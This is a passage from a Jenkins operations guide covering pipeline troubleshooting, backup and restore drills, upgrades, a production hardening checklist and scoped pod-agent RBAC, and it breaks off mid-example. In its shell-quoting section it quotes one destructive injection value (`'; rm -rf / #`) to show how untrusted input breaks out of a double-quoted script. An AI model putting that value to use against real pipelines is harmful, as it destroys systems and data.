   ⭐ and `npm-groovy-lint` catches them locally:
      npx npm-groovy-lint --path Jenkinsfile --failon error

⛔ "No such DSL method 'foo' found among steps"
   → a typo, or the shared library isn't loaded, or the vars/ file isn't named right.
   → the error message LISTS every available step — read it.

⛔ "java.lang.NullPointerException: Cannot get property 'x' on null object"
   → env.CHANGE_ID is null on a branch build. Use `env.CHANGE_ID?.something` (safe nav)
     or `params.X ?: 'default'`.
```

### 10.3 The `sh` step surprises

```groovy
// ⛔ the single-quote / double-quote confusion
sh "echo ${env.FOO}"     // Groovy interpolates → the VALUE is inlined into the script
sh 'echo $FOO'           // the SHELL interpolates → ⭐ SAFER, and injection-proof
sh "echo '$FOO'"         // ⛔⛔ if $FOO contains a single quote, the script breaks
                         //    — and if it contains `'; rm -rf / #`, you're owned

// ⭐⭐ THE RULE
//   · single quotes for the script body
//   · pass untrusted values through `env:` or `withEnv`
sh 'echo "$TITLE"'
// with env: [TITLE: env.CHANGE_TITLE]           ⭐ CHANGE_TITLE is attacker-controlled

// ⛔ "script returned exit code 1" with no output
//    → the script failed AND wrote nothing to stdout/stderr
//    → FIX: `set -x` (but NOT with secrets), or add `echo` checkpoints
sh '''
  set -euo pipefail
  echo "==> step 1"; do_thing_1
  echo "==> step 2"; do_thing_2
'''

// ⛔ the step succeeds but returnStdout is empty
//    → the command wrote to STDERR, not STDOUT
//    → FIX: `2>&1` or use returnStatus and check separately
def out = sh(returnStdout: true, script: 'some-cmd 2>&1').trim()

// ⛔ the output has a trailing newline and your comparison fails
//    → ⭐ ALWAYS `.trim()`
def sha = sh(returnStdout: true, script: 'git rev-parse HEAD').trim()

// ⛔ a multiline command's exit code is the LAST command's
sh '''
  false          # ⛔ this failure is SWALLOWED
  true           # → exit code 0, the step "succeeds"
'''
// ⭐ FIX: `set -e` (or `set -euo pipefail`) at the TOP of every sh block

// ⛔ a background process keeps the step alive
sh './server.sh &'          // ⛔ the step waits for the pipe to close, forever
// ⭐ FIX:
sh '''
  nohup ./server.sh > server.log 2>&1 &
  disown
  sleep 5
  curl --retry 10 --retry-connrefused http://localhost:8080/health
'''
// ⭐ or set a timeout: timeout(time: 5, unit: 'MINUTES') { sh './server.sh &' }
```

### 10.4 Kubernetes agent problems

```bash
# ⛔ the pod is Created but never Ready
kubectl -n jenkins describe pod <agent> | sed -n '/Events/,$p'
#   FailedMount       → a referenced Secret/ConfigMap doesn't exist
#   FailedScheduling  → insufficient cpu/memory, or the nodeSelector matches nothing
#   ErrImagePull      → a bad tag or no pull secret
#   CreateContainerConfigError → an envFrom referencing a missing secret

# ⛔ the jnlp container CrashLoopBackOff
kubectl -n jenkins logs <agent> -c jnlp
#   "The server rejected the connection: … is not a valid agent name"
#   → ⛔ you set `command:` or `args:` on the jnlp container. LEAVE THEM EMPTY.
#   "Failing over to a new agent name"
#   → a previous pod with the same name is still terminating. Set idleMinutes: 0.

# ⛔ the agent connects but the workspace is empty
#   → the workspaceVolume isn't mounted in the container you're using
kubectl -n jenkins get pod <agent> -o json | jq '.spec.containers[] | {name, volumeMounts}'

# ⛔ "Ping response time out" / the agent goes offline mid-build
#   → the controller→agent connection dropped. Check:
kubectl -n jenkins get svc jenkins-agent -o wide
kubectl -n jenkins logs sts/jenkins -c jenkins | grep -iE 'ping|offline|channel'
#   → ⭐ the `jenkinsTunnel` URL in the cloud config is the usual culprit
#   → ⭐ or a NetworkPolicy blocking port 50000
kubectl -n jenkins get networkpolicy -o yaml | grep -A10 50000

# ⛔ agent pods accumulate and are never deleted
#   → `garbageCollection.timeout` is 0, or the controller lost track
kubectl -n jenkins delete pods -l jenkins/label --field-selector=status.phase==Succeeded
#   ⭐ and the Script Console:
```

```groovy
// ⭐ clean up orphaned agent pods
import org.csanchez.jenkins.plugins.kubernetes.KubernetesCloud
def cloud = Jenkins.instance.clouds.find { it instanceof KubernetesCloud }
println "cloud: ${cloud.name}  containerCap=${cloud.containerCap}"
println "connected agents: ${cloud.getConnectedAgents().size()}"
// find pods with no corresponding build
Jenkins.instance.nodes.each { n ->
  def c = n.computer
  if (c?.offline && c?.temporarilyOffline) {
    println "  offline node: ${n.nodeName} — ${c.offlineCauseReason}"
  }
}
// ⭐ terminate a specific node
Jenkins.instance.getNode('shop-47-abc')?.terminate()
// ⭐ terminate ALL offline nodes
Jenkins.instance.nodes.findAll { it.computer?.offline }.each {
  println "  terminating ${it.nodeName}"
  it.terminate()
}
```

### 10.5 SCM problems

```groovy
// ⛔ "Could not resolve branch: origin/main"
//    → the branch doesn't exist, or the credentials can't see it
//    → ⭐ in a multibranch job the ref is already resolved; use `checkout scm`

// ⛔ shallow clone breaks `git describe` / `git log`
checkout scmGit(branches: scm.branches, extensions: [
  cloneOption(depth: 0, shallow: false, noTags: false, timeout: 30)  // ⭐ a FULL clone
], userRemoteConfigs: scm.userRemoteConfigs)

// ⛔ "fatal: detected dubious ownership in repository"
//    → the workspace is owned by a different UID than the container's user
//    → FIX: `git config --global --add safe.directory "$WORKSPACE"`
//    → or set fsGroup on the pod's securityContext so the volume is group-owned

// ⛔ submodule / LFS failures
checkout scmGit(extensions: [
  submodule(option: [recursive: true, parentCredentials: true, shallow: true]),
  lfs(),
  cleanBeforeCheckout()
])

// ⭐ the credential for a private repo, in a multibranch job
//    the branch source supplies it — you don't need to specify it in the Jenkinsfile.
//    For a SECOND repository:
checkout([$class: 'GitSCM',
  branches: [[name: '*/main']],
  userRemoteConfigs: [[url: 'https://github.com/3558Bhk/other.git',
                       credentialsId: 'github-bot']],
  extensions: [[$class: 'RelativeTargetDirectory', relativeTargetDir: 'other'],
               [$class: 'CloneOption', depth: 1, shallow: true]]])
```

### 10.6 The controller is sick

```bash
# ⭐ the thread dump — the single most useful Jenkins diagnostic
curl -s -u admin:$TOKEN "$JENKINS_URL/threadDump" > threaddump.txt
grep -A20 'BLOCKED\|WAITING' threaddump.txt | head -60
# ⭐ look for:
#   "Waiting for lockable resource"        → a stuck lock
#   "hudson.model.Queue"                   → the queue maintainer is stuck
#   "CpsFlowExecution"                     → a pipeline is stuck
#   "java.net.SocketInputStream.socketRead" → a hung HTTP call in a build

# ⭐ the support bundle (if the support-core plugin is installed)
#    Manage Jenkins → Support → ⭐ "Download a support bundle"
#    → thread dumps, logs, config, plugin list, memory — everything, in one zip

# ⭐ memory
kubectl -n jenkins top pod
kubectl -n jenkins exec sts/jenkins -c jenkins -- jcmd 1 GC.heap_info
kubectl -n jenkins exec sts/jenkins -c jenkins -- jcmd 1 VM.native_memory summary 2>/dev/null
# ⭐ the heap dump (careful — it contains EVERY SECRET in memory)
kubectl -n jenkins exec sts/jenkins -c jenkins -- \
  jcmd 1 GC.heap_dump /var/jenkins_home/heap.hprof
kubectl -n jenkins cp jenkins-0:/var/jenkins_home/heap.hprof ./heap.hprof
# ⛔ NEVER commit a heap dump. It has every credential. Delete it after analysis.

# ⭐ disk
kubectl -n jenkins exec sts/jenkins -c jenkins -- df -h /var/jenkins_home
kubectl -n jenkins exec sts/jenkins -c jenkins -- du -sh /var/jenkins_home/* | sort -h
#   the usual hogs: jobs/*/builds/*/log, jobs/*/builds/*/archive, plugins/, caches/
# ⭐ tighten the build discarder:
```

```groovy
// ⭐ enforce a build discarder on EVERY job
import hudson.model.*
import hudson.tasks.LogRotator
Jenkins.instance.allItems(Job).each { job ->
  def prop = job.getProperty(BuildDiscarderProperty)
  if (prop == null || !(prop.strategy instanceof LogRotator)) {
    println "  setting a discarder on ${job.fullName}"
    job.addProperty(new BuildDiscarderProperty(
      new LogRotator('-1', '100', '-1', '20')))     // keep 100 builds, 20 with artifacts
    job.save()
  }
}
println "  ✅ done"

// ⭐ find the jobs with the most disk usage
import hudson.model.*
def sizes = [:]
Jenkins.instance.allItems(Job).each { job ->
  try {
    def dir = job.rootDir
    if (dir?.exists()) {
      sizes[job.fullName] = dir.listTree().collect { it.length() }.sum() ?: 0
    }
  } catch (e) {}
}
sizes.sort { -it.value }.take(15).each { k, v ->
  println "  ${(v / 1024 / 1024).round(1).toString().padLeft(10)} MB   $k"
}
```

### 10.7 A table of the failures

| Symptom | Cause | Fix |
|---|---|---|
| ⛔ "There are no nodes with the label 'X'" | The pod template's `label` doesn't match, or `nodeUsageMode: EXCLUSIVE` | Check the template's label string; use `label 'shop linux'` not `label 'shop,linux'` |
| The build runs on `built-in` | ⛔ The controller has executors > 0 | Set `numExecutors: 0` and `mode: EXCLUSIVE` |
| The pod agent's workspace is empty | `workspaceVolume` not mounted in the container | Use `workspaceVolume: emptyDirWorkspaceVolume`, or mount explicitly |
| ⛔ NotSerializableException | A JsonSlurper/Matcher held across a step | `@NonCPS`, or don't hold it |
| A `sh` step's variable is empty | Single vs double quotes | `sh 'echo "$X"'` + `withEnv` |
| The build hangs at 99% | A background process holds the stdout pipe | `nohup … & disown`, or a step `timeout` |
| ⛔ "Access is denied" reading a credential | The credential is in a different folder scope | Move it, or move the job |
| The approval never appears | `submitter:` names a group that doesn't exist | Check the group name in your security realm |
| ⛔ A fork PR read a production credential | `trustEveryone()` or credentials in the wrong scope | `trustNobody()` + folder-scoped credentials + a separate production job |
| Plugins broke after an update | You clicked "install all updates" | Bake plugins into the image with pinned versions; test in a throwaway namespace |
| ⛔ Every email link points to localhost | The Jenkins URL isn't set | `unclassified.location.url` in JCasC |
| The cron never fires | The cron is in the CONTROLLER's timezone, and `H` jitter | Use `H 2 * * 1-5`; check Manage Jenkins → System Information → `user.timezone` |
| ⛔ The webhook doesn't trigger | GitHub can't reach Jenkins, or the secret is wrong | The GitHub repo's webhook delivery log shows the HTTP status; check the crumb |
| The build is slower than locally | 2 vCPU / 1 GB in the pod template's resource requests | Raise `resourceRequestCpu`/`Memory`; the request drives scheduling |
| ⛔ "Agent went offline" mid-build | The pod was evicted (node pressure) or OOMKilled | `kubectl describe pod` → the reason. Raise the memory limit or set a `PriorityClass` |

---

## 11 · Backup, upgrade and disaster recovery

### 11.1 What's in JENKINS_HOME ⭐

```
/var/jenkins_home/
├── config.xml                    ⭐⭐ THE ENTIRE GLOBAL CONFIG (JCasC overwrites this)
├── credentials.xml               ⭐⭐ ENCRYPTED credentials — encrypted with the
│                                    secrets in secrets/. Losing secrets/ loses them all.
├── secrets/                      ⭐⭐⭐ THE MASTER KEY. Back this up or everything is lost.
│   ├── master.key
│   ├── hudson.util.Secret
│   └── initialAdminPassword
├── identity.key.enc              the SSH identity for remoting
├── jobs/                         ⭐ every job
│   └── shop/main/
│       ├── config.xml            the job definition
│       ├── builds/               ⭐⭐ the build history — usually 90% of the disk
│       │   └── 47/
│       │       ├── log           the console output
│       │       ├── build.xml     the build metadata
│       │       └── archive/      the archived artifacts
│       └── workspace/            ⭐ EPHEMERAL — do NOT back this up
├── users/                        local users (if you use the local realm)
├── plugins/                      ⭐ installed plugin JARs — reproducible from plugins.txt
├── nodes/                        static agent definitions
├── updates/                      the plugin update-center cache
├── casc.yaml                     the JCasC config (if mounted here)
└── logs/

⭐ THE BACKUP PRIORITY
   1. secrets/                    ⭐⭐⭐ without it, credentials.xml is useless
   2. config.xml + credentials.xml
   3. jobs/*/config.xml           (or: regenerate from Job DSL / JCasC)
   4. jobs/*/builds/*/build.xml   (the history metadata — small)
   5. jobs/*/builds/*/log         (the console logs — LARGE, maybe skip)
   ⛔ SKIP: workspace/, plugins/ (reproducible), caches/, tmp/
```

### 11.2 The backup CronJob

```yaml
# k8s/jenkins-backup.yaml
apiVersion: v1
kind: ServiceAccount
metadata: {name: jenkins-backup, namespace: jenkins}
---
apiVersion: rbac.authorization.k8s.io/v1
kind: Role
metadata: {name: jenkins-backup, namespace: jenkins}
rules:
  - apiGroups: ['']
    resources: [persistentvolumeclaims]
    verbs: [get, list]
---
apiVersion: batch/v1
kind: CronJob
metadata:
  name: jenkins-backup
  namespace: jenkins
spec:
  schedule: '0 1 * * *'                  # ⭐ 01:00 UTC = 06:30 IST, daily
  concurrencyPolicy: Forbid
  successfulJobsHistoryLimit: 3
  failedJobsHistoryLimit: 7
  startingDeadlineSeconds: 3600
  jobTemplate:
    spec:
      backoffLimit: 2
      activeDeadlineSeconds: 3600
      template:
        spec:
          serviceAccountName: jenkins-backup
          restartPolicy: Never
          containers:
            - name: backup
              image: restic/restic:0.17.1
              env:
                - {name: RESTIC_REPOSITORY, value: 's3:s3.ap-south-1.amazonaws.com/shop-jenkins-backup'}
                - name: RESTIC_PASSWORD
                  valueFrom: {secretKeyRef: {name: restic, key: password}}
                - {name: AWS_ACCESS_KEY_ID, valueFrom: {secretKeyRef: {name: restic, key: aws-key}}}
                - {name: AWS_SECRET_ACCESS_KEY, valueFrom: {secretKeyRef: {name: restic, key: aws-secret}}}
              command:
                - /bin/sh
                - -c
                - |
                  set -euo pipefail
                  echo "==> initializing the repo (idempotent)"
                  restic init --repo "$RESTIC_REPOSITORY" 2>/dev/null || true

                  echo "==> telling Jenkins to flush its state"
                  # ⭐⭐ the SAFE way: ask Jenkins to save, then snapshot the PVC
                  curl -sf -XPOST -u "$JENKINS_USER:$JENKINS_TOKEN" \
                    "$JENKINS_URL/reload" >/dev/null || \
                    echo "  ⚠️  could not trigger a reload — snapshotting anyway"

                  echo "==> backing up"
                  # ⭐ the INCLUDE list, not the exclude list — deliberate
                  restic backup /var/jenkins_home \
                    --tag "jenkins,daily,$(date -u +%F)" \
                    --exclude '/var/jenkins_home/*/workspace' \
                    --exclude '/var/jenkins_home/*/workspace@*' \
                    --exclude '/var/jenkins_home/workspace' \
                    --exclude '/var/jenkins_home/caches' \
                    --exclude '/var/jenkins_home/tmp' \
                    --exclude '/var/jenkins_home/logs/*.log.*' \
                    --exclude '/var/jenkins_home/war' \
                    --exclude '/var/jenkins_home/plugins/*.jpi.tmp' \
                    --one-file-system --read-concurrency 4

                  echo "==> the retention policy"
                  restic forget --prune \
                    --keep-daily 14 --keep-weekly 8 --keep-monthly 12 --keep-yearly 3 \
                    --tag jenkins

                  echo "==> ⭐ VERIFYING the backup (an unverified backup is not a backup)"
                  restic check --read-data-subset=5%

                  echo "==> the stats"
                  restic stats --mode raw-data
                  restic snapshots --tag "daily,$(date -u +%F)"
              volumeMounts:
                - {name: jenkins-home, mountPath: /var/jenkins_home, readOnly: true}
                # ⭐⭐ READ-ONLY — a backup job must never be able to modify Jenkins
              resources:
                requests: {cpu: 250m, memory: 512Mi}
                limits: {cpu: '1', memory: 2Gi}
          volumes:
            - name: jenkins-home
              persistentVolumeClaim: {claimName: jenkins}
```

### 11.3 The restore drill ⭐⭐ (do it quarterly)

```bash
# ⭐ a backup you have never restored is a hypothesis, not a backup.
# 1. a fresh namespace
kubectl create namespace jenkins-drill

# 2. restore to a scratch PVC
restic snapshots --tag jenkins --latest 1
restic restore $SNAPSHOT --target /restore --include '/var/jenkins_home/secrets' \
                                              --include '/var/jenkins_home/config.xml' \
                                              --include '/var/jenkins_home/credentials.xml' \
                                              --include '/var/jenkins_home/jobs'
ls -la /restore/var/jenkins_home/

# 3. ⭐ start Jenkins from the restored state
docker run -d --name jenkins-drill -p 18080:8080 \
  -v /restore/var/jenkins_home:/var/jenkins_home \
  jenkins/jenkins:2.568.3-lts
sleep 90
curl -sf http://localhost:18080/login >/dev/null && echo "✅ Jenkins started"

# 4. ⭐⭐ verify the CRITICAL things
#   a) can you log in with the pre-existing credentials?
curl -s -o /dev/null -w '%{http_code}\n' -u admin:$PASSWORD http://localhost:18080/api/json
#      → 200 means the secrets/ master key decrypted credentials.xml correctly.
#        ⛔ 401 = you restored credentials.xml WITHOUT secrets/. All creds are gone.
#   b) are the jobs there?
curl -s -u admin:$PASSWORD http://localhost:18080/api/json?tree=jobs[name] | jq
#   c) can a build actually run?
curl -s -XPOST -u admin:$PASSWORD http://localhost:18080/job/shop/job/main/build
#   d) are the credentials readable?
#      Manage Jenkins → Credentials → open one → it should show its metadata

# 5. record the drill
cat >> restore-drills.jsonl <<EOF
{"ts":"$(date -u +%FT%TZ)","snapshot":"$SNAPSHOT","restoreSeconds":$SECONDS,
 "loginOk":true,"jobsRestored":$(curl -s -u admin:$PASSWORD http://localhost:18080/api/json?tree=jobs[name] | jq '.jobs|length'),
 "buildOk":true,"notes":"clean restore"}
EOF
```

### 11.4 Upgrading Jenkins

```bash
# ⭐ the procedure (LTS → a newer LTS)
# 0. read the upgrade guide — https://www.jenkins.io/doc/upgrade-guide/
#    ⭐⭐ 2.555+ REQUIRES JAVA 21. If your custom image installs Java 17, it breaks.

# 1. inventory
ssh -p 50000 admin@jenkins list-plugins > plugins-before.txt
curl -s -u admin:$TOKEN "$JENKINS_URL/api/json?tree=jobs[fullName]" | jq -r '.jobs[].fullName' > jobs-before.txt

# 2. ⭐ BACK UP (§11.2) and VERIFY the backup

# 3. test in a throwaway namespace
kubectl create namespace jenkins-canary
sed 's/2.568.3-lts/2.578.1-lts/' values.yaml > values-canary.yaml
helm upgrade --install jenkins-canary jenkinsci/jenkins -n jenkins-canary \
  --values values-canary.yaml --wait --timeout 15m
# ⭐ restore the backup INTO the canary and run every critical job
kubectl -n jenkins-canary logs sts/jenkins-canary -c jenkins | grep -iE 'SEVERE|WARNING' | head -30

# 4. check plugin compatibility
#    Manage Jenkins → Plugins → Updates → ⭐ "Compatibility warnings"
#    ⛔ a plugin marked "requires Jenkins 2.600" will FAIL to load and may
#       silently disable the steps it provides.

# 5. the cutover
helm upgrade --install jenkins jenkinsci/jenkins -n jenkins \
  --values values-canary.yaml --wait --timeout 15m --atomic
kubectl -n jenkins rollout status sts/jenkins

# 6. verify
curl -s -u admin:$TOKEN "$JENKINS_URL/api/json?tree=jobs[fullName]" | jq -r '.jobs[].fullName' > jobs-after.txt
diff jobs-before.txt jobs-after.txt && echo "  ✅ no job was lost"
ssh -p 50000 admin@jenkins list-plugins > plugins-after.txt
diff plugins-before.txt plugins-after.txt
# ⭐ run one build of every critical job
for job in shop/main shop/production/deploy platform/seed; do
  curl -s -XPOST -u admin:$TOKEN "$JENKINS_URL/job/${job//\//\/job\/}/buildWithParameters"
done

# 7. ⭐ the rollback
helm rollback jenkins $(( $(helm history jenkins -n jenkins -o json | jq 'length') - 1 )) -n jenkins
# and if the PVC was touched by the new version, restore from the backup

# ⭐ the frequency: track LTS, upgrade every 12 weeks (every LTS line),
#   and NEVER skip more than two LTS lines.
```

### 11.5 HA — the honest answer

```
⛔ Jenkins does NOT do active-active HA. The controller is a single JVM with a
   single JENKINS_HOME. There is no shared-state mode.

What you CAN do:
  ✅ Kubernetes does the failover. The StatefulSet restarts the pod, the PVC
     reattaches, and Jenkins is back in 60–120 seconds. Set:
       livenessProbe:  /login, initialDelaySeconds 120, periodSeconds 30
       readinessProbe: /login, periodSeconds 10
     ⭐ a Jenkins cold start on a big install takes 2–5 minutes. Don't kill it early.
  ✅ Keep JENKINS_HOME small (a tight build discarder) so the restart is fast.
  ✅ Configuration as code + a baked image → a full rebuild from nothing in 10 minutes.
  ✅ A hot standby is NOT possible with the standard architecture.
  ✅ CloudBees CI (the commercial product) DOES offer HA controllers.

⭐⭐ THE REAL RESILIENCE ANSWER:
   Make Jenkins' STATE unimportant.
     · jobs defined in Job DSL / JCasC in Git  → recreatable
     · plugins pinned in plugins.txt + a baked image → recreatable
     · credentials in Vault, referenced not stored → nothing to restore
     · build history in a metrics system (Prometheus) and artifacts in a registry
       / object store → the history in Jenkins is a convenience, not a record
   Then "restore" means "deploy the Helm chart and let JCasC + the seed job rebuild
   everything", which takes 10 minutes and needs no backup at all.
```

---

## 12 · The production checklist

```
THE CONTROLLER
  □ ⭐⭐ `numExecutors: 0` and `mode: EXCLUSIVE` on the built-in node
  □ the Jenkins URL set correctly (or every email link is wrong)
  □ the image tag PINNED (2.568.3-lts), never `latest`
  □ Java 21 confirmed (2.555+ requires it)
  □ resources: ≥2 CPU / ≥4 Gi for a small install; the heap at 75% of the limit
  □ liveness and readiness probes with a LONG initialDelaySeconds (2–5 min cold start)
  □ the slaveAgentPort is FIXED (50000) so a NetworkPolicy can be written
  □ `remotingSecurity.enabled: true`
  □ ⭐ Agent → Controller Access Control ENABLED with a restrictive command allowlist
  □ CSRF protection ON
  □ the CLI over HTTP and over Remoting are OFF
  □ the markup formatter is Safe HTML, never Raw HTML
  □ `DirectoryBrowserSupport.CSP` set
  □ a NetworkPolicy limiting who may reach 8080 and 50000

SECURITY AND AUTHORIZATION
  □ the security realm is LDAP/SAML/OIDC — not the local user database
  □ "Allow users to sign up" is OFF
  □ ⭐ an escape-hatch local admin exists and its password is in a vault
  □ the authorization strategy is Role-Based or Matrix — never "anyone can do anything"
  □ ⭐⭐ `authorize-project`: builds run as the USER WHO TRIGGERED THEM
  □ Overall/Administer is granted to ≤3 identities, all named
  □ Script Console access is understood to mean "owns every secret"
  □ folder-scoped authorization for production jobs
  □ the security audit script (§7.5) run monthly

CREDENTIALS ⭐⭐
  □ credentials scoped to FOLDERS, not Global
  □ the multibranch job's folder has NO production credentials
  □ production credentials live in a nested folder with its own authorization
  □ `withCredentials` used with SINGLE-QUOTED `sh` scripts
  □ ⭐ no `echo "$SECRET"`, no `set -x`, no double-quoted Groovy interpolation
  □ no credential written to a file that is archived
  □ ⭐ OIDC federation (§4.6) or Vault, so NO cloud key is stored in Jenkins
  □ a credential rotation rehearsed
  □ the job-config-history plugin installed (who changed what, when)
  □ an audit of which jobs reference which credentials (§4.4) run quarterly

AGENTS
  □ the Kubernetes cloud with ephemeral pod agents
  □ `idleMinutes: 0` and `podRetention: never`
  □ `alwaysPullImage: true` on every container
  □ ⭐ `privileged: false` everywhere; `automountServiceAccountToken: false`
  □ `containerCap` and per-template `instanceCap` set
  □ the workspace volume is a bounded `emptyDir` (a runaway build can't fill a node)
  □ the controller's RBAC is a Role in the jenkins NAMESPACE, not a ClusterRole
  □ ⭐ the RBAC verified: the controller cannot read secrets in the `shop` namespace
  □ Kaniko, not a mounted Docker socket, not a privileged DinD
  □ `nodeUsageMode: EXCLUSIVE` so builds don't land on the wrong template
  □ `when { beforeAgent true }` used so skipped stages don't allocate a pod

PIPELINES
  □ the Jenkinsfile is in the repository, at a known path
  □ ⭐ the logic is in `scripts/*.sh` (shellcheck-able) and the shared library,
     NOT in inline Groovy
  □ `set -euo pipefail` at the top of every `sh` block
  □ single-quoted `sh` scripts; untrusted values passed via `env:`/`withEnv`
  □ `timeout(...)` on the pipeline AND on the `input` step
  □ `buildDiscarder` on every job (via the properties block or JCasC)
  □ `disableConcurrentBuilds()` or an explicit `lock`
  □ `timestamps()` and `ansiColor('xterm')` so logs are readable
  □ `junit allowEmptyResults: false` so a missing report FAILS
  □ the `post` block handles always/success/unstable/failure/aborted/cleanup
  □ @NonCPS used wherever a non-serializable object is touched

SHARED LIBRARY
  □ ⭐ pinned to a TAG or a SHA in every consumer, never `@master`
  □ `Load implicitly` is OFF
  □ the library has its own CI: unit tests (JenkinsPipelineUnit), a lint, a contract test
  □ every `vars/*.groovy` step is documented in docs/API.md
  □ a breaking change gets a new MAJOR version
  □ the library's release is itself a tagged, reviewed event

MULTIBRANCH
  □ ⭐⭐ `trustNobody()` on the fork PR discovery trait
  □ `buildOriginBranchWithPR(false)` — no double builds
  □ the orphaned-item strategy DISABLES rather than DELETES
  □ a `headWildcardFilter` limiting which branches are discovered
  □ webhooks configured (with a `periodicFolderTrigger` backstop)
  □ the production deploy is a SEPARATE job in a SEPARATE folder, not a branch

GATES AND DEPLOYMENT
  □ `input` with a `submitter` group, a `submitterParameter`, and a `timeout`
  □ the timeout is CAUGHT and fails the build (a silent timeout is a silent skip)
  □ the approver's input is VALIDATED (a ticket ID matches a regex)
  □ ⭐ Lockable Resources for the production mutex AND the DB-migration mutex
  □ `milestone()` used so a superseded build doesn't deploy
  □ the programmatic gate: the deployment window, the SLO burn rate, firing alerts
  □ an override path with a mandatory reason, recorded and notified
  □ build once, promote by DIGEST (stash/unstash the digest files)
  □ `helm --atomic --timeout`, a post-deploy smoke test, an automatic rollback
  □ the deploy record archived as an artifact
  □ the rollback rehearsed and timed

PLUGINS
  □ a pinned `plugins.txt` baked into a custom image
  □ `installLatestPlugins: false`
  □ the update procedure: inventory → backup → canary namespace → cutover → verify
  □ no deprecated plugin still active
  □ `script-security` present and NOT disabled
  □ `job-config-history` and `audit-trail` installed
  □ the Script Approval queue is empty or every entry has a written justification

BACKUP AND RECOVERY
  □ a daily backup of secrets/, config.xml, credentials.xml and jobs/*/config.xml
  □ ⭐⭐ the RESTORE DRILL run this quarter, with a recorded time-to-restore
  □ workspace/, plugins/ and caches/ EXCLUDED from the backup
  □ the backup mount is READ-ONLY
  □ `restic check --read-data-subset=5%` runs after every backup
  □ a documented rebuild-from-nothing procedure (Helm + JCasC + seed job)
  □ the JENKINS_HOME size monitored with an alert at 85% full

OBSERVABILITY
  □ the Prometheus plugin scraping /prometheus
  □ alerts: JenkinsDown, QueueBacklog, QueueBlocked, AgentPodsFailing,
     BuildFailureRateHigh, PluginsFailed, DiskAlmostFull
  □ a Grafana dashboard with build results, duration percentiles, agent count, queue depth
  □ ⭐ the pipeline pushes its own metrics to the Pushgateway (build duration,
     deploy count) — so the DORA metrics come from the pipeline, not from Jenkins
  □ the build's own logs are archived to object storage (Jenkins' logs are ephemeral)
```

---

<a name="tasks--answers"></a>
## 🎯 Tasks & Answers

Five tasks. Each is real Jenkins work. **Attempt them before opening the answer.**

| # | Task |
|---|---|
| 3.1 | Install Jenkins on kind with **ephemeral Kubernetes pod agents** and prove no build ever touches the controller |
| 3.2 | Build the **shared library** with `vars/`, `src/`, `resources/` and unit tests, pinned and consumed by three jobs |
| 3.3 | Implement **production approval + the mutex + the window gate**, and prove the timeout fails safely |
| 3.4 | **Harden a Jenkins** that was set up by clicking through the UI: find and fix every problem with the audit script |
| 3.5 | Migrate a **Freestyle-job estate** to pipelines with Job DSL, without losing build history |

---

### Task 3.1 — Ephemeral pod agents, and proof the controller is clean

**Requirements:** every build runs in a Kubernetes pod created on demand and destroyed after. The built-in node runs **zero** builds. No agent pod is privileged. No agent pod has cluster API access. Kaniko builds images. And you must **prove** all four from inside a pipeline.

**✅ Answer**

**Step 1 — the RBAC, minimally scoped**

```bash
cat > rbac.yaml <<'EOF'
# ── the CONTROLLER's identity: may create agent pods in `jenkins` ONLY ──
apiVersion: v1
kind: ServiceAccount
metadata: {name: jenkins, namespace: jenkins}
---
apiVersion: rbac.authorization.k8s.io/v1
kind: Role                                  # ⭐⭐ Role, NOT ClusterRole
metadata: {name: jenkins-agent-manager, namespace: jenkins}
rules:
  - apiGroups: ['']
    resources: [pods, pods/log, pods/exec]
    verbs: [get, list, watch, create, update, patch, delete]
  - apiGroups: ['']
    resources: [secrets]                    # ⭐ needs secrets to inject credentials
    verbs: [get, list, watch, create, delete]
  - apiGroups: ['']
    resources: [configmaps, serviceaccounts, persistentvolumeclaims, events]
    verbs: [get, list, watch, create, update, patch, delete]
---
apiVersion: rbac.authorization.k8s.io/v1
kind: RoleBinding
metadata: {name: jenkins-agent-manager, namespace: jenkins}
roleRef: {apiGroup: rbac.authorization.k8s.io, kind: Role, name: jenkins-agent-manager}
subjects: [{kind: ServiceAccount, name: jenkins, namespace: jenkins}]
---
# ── the AGENT's identity: may do NOTHING ─────────────────────────
apiVersion: v1
kind: ServiceAccount
metadata: {name: jenkins-agent, namespace: jenkins}
# ⭐⭐ no Role, no RoleBinding. The agent has NO cluster permissions at all.
#    Combined with automountServiceAccountToken: false, it has no token either.
---
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata: {name: jenkins-agents, namespace: jenkins}
spec:
  podSelector: {matchLabels: {jenkins/label: shop}}
  policyTypes: [Ingress, Egress]
  ingress:
    - from: [{podSelector: {matchLabels: {app.kubernetes.io/name: jenkins}}}]
      ports: [{port: 50000, protocol: TCP}]
  egress:
    - to: [{podSelector: {matchLabels: {app.kubernetes.io/name: jenkins}}}]
      ports: [{port: 50000}, {port: 8080}]
    - to: [{namespaceSelector: {matchLabels: {kubernetes.io/metadata.name: kube-system}}}]
      ports: [{port: 53, protocol: UDP}, {port: 53, protocol: TCP}]
    - to: [{ipBlock: {cidr: 0.0.0.0/0, except: ['10.0.0.0/8', '172.16.0.0/12']}}]
      ports: [{port: 443}, {port: 80}]
    # ⭐⭐ the agent may reach the internet (to fetch dependencies) but NOT
    #    the cluster's internal services — including the Kubernetes API,
    #    the databases, or Prometheus. That's a real blast-radius reduction.
EOF
kubectl apply -f rbac.yaml

# ⭐ PROVE the scoping
SA=system:serviceaccount:jenkins:jenkins
AGENT_SA=system:serviceaccount:jenkins:jenkins-agent
for q in "create pods -n jenkins" "get secrets -n jenkins" "get secrets -n shop" \
         "create pods -n shop" "list nodes" "get clusterrolebindings"; do
  printf '  %-38s controller=%-4s agent=%s\n' "$q" \
    "$(kubectl auth can-i $q --as=$SA 2>/dev/null)" \
    "$(kubectl auth can-i $q --as=$AGENT_SA 2>/dev/null)"
done
#   create pods -n jenkins                     controller=yes  agent=no    ✅
#   get secrets -n jenkins                     controller=yes  agent=no    ✅
#   get secrets -n shop                        controller=no   agent=no    ✅⭐
#   create pods -n shop                        controller=no   agent=no    ✅⭐
#   list nodes                                 controller=no   agent=no    ✅
#   get clusterrolebindings                    controller=no   agent=no    ✅
```

**Step 2 — the pod template with hardened security**

```yaml
# (inside the JCasC `jenkins.clouds[0].templates`)
- name: 'shop-hardened'
  namespace: 'jenkins'
  label: 'shop hardened'
  nodeUsageMode: EXCLUSIVE                 # ⭐ only jobs that ASK for this label
  serviceAccount: 'jenkins-agent'
  instanceCap: 20
  idleMinutes: 0                           # ⭐⭐ destroy the moment the build ends
  podRetention: never                      # ⭐⭐ not even on failure
  activeDeadlineSeconds: 900
  inheritFrom: ''
  containers:
    - name: 'jnlp'
